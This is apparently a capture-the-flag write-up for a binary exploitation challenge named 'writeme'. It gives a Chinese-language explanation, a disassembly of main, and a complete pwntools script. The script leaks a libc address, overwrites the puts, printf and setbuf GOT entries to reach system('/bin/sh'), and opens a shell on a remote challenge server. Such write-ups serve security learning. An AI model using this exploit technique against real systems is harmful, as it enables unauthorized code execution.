## writeme (150)
Credits to my teammates.

### solution
先將讀寫memory位置設為puts got的位置，leak出puts在lib的address，並得到system address
將puts got改為0x4006d3，使得process可以不斷重複讀寫memory的過程
發現0x4006ad是一段會將rdi寫為0x600be0並呼叫setbuf，所以只要把0x600be0寫為'/bin/sh'（改掉會使得printf發生error,需先將printf got改掉，setbuf got改為system即可get shell
以上過程皆可藉著不斷重複讀寫指定memory位置這段code完成
```
0000000000400696 <main>:
  400696:	55                   	push   rbp
  400697:	48 89 e5             	mov    rbp,rsp
  40069a:	48 83 ec 10          	sub    rsp,0x10
  40069e:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
  4006a5:	00 00 
  4006a7:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4006ab:	31 c0                	xor    eax,eax
  4006ad:	48 8b 05 2c 05 20 00 	mov    rax,QWORD PTR [rip+0x20052c]        # 600be0 <__TMC_END__>
  4006b4:	be 00 00 00 00       	mov    esi,0x0
  4006b9:	48 89 c7             	mov    rdi,rax
  4006bc:	e8 8f fe ff ff       	call   400550 <setbuf@plt>
  4006c1:	48 c7 45 f0 00 00 00 	mov    QWORD PTR [rbp-0x10],0x0
  4006c8:	00 
  4006c9:	bf 04 08 40 00       	mov    edi,0x400804
  4006ce:	e8 5d fe ff ff       	call   400530 <puts@plt>
  4006d3:	bf 0b 08 40 00       	mov    edi,0x40080b
  4006d8:	b8 00 00 00 00       	mov    eax,0x0
  4006dd:	e8 7e fe ff ff       	call   400560 <printf@plt>
```

### script

```python
from pwn import *
r = remote('35.194.194.168',6666)
#r = process('./writeme')

buf = 0x600100
puts_got = 0x600ba0
printf_got = 0x600bb8
setbuf_got = 0x600bb0
start = 0x4006d3
mov_rax_rdi_add = 0x600be0
bin_sh  = '29400045130965551'

r.recvuntil(':')

r.sendline(str(puts_got))
r.recvuntil('=')
puts_lib = int(r.recvuntil('\n').strip(),16)
r.sendline(str(start))

r.sendline(str(printf_got))
r.recv()
r.sendline(str(puts_lib))

r.sendline(str(buf))
r.recv()
r.sendline(bin_sh)

r.sendline(str(mov_rax_rdi_add))
r.recv()
r.sendline(str(buf))
r.recv()

r.sendline(str(setbuf_got))
r.recv()
r.sendline(str(puts_lib - 0x6f690 + 0x45390))
r.recv()

r.sendline(str(puts_got))
r.recv()
r.sendline(str(0x4006ad))

r.interactive()
```
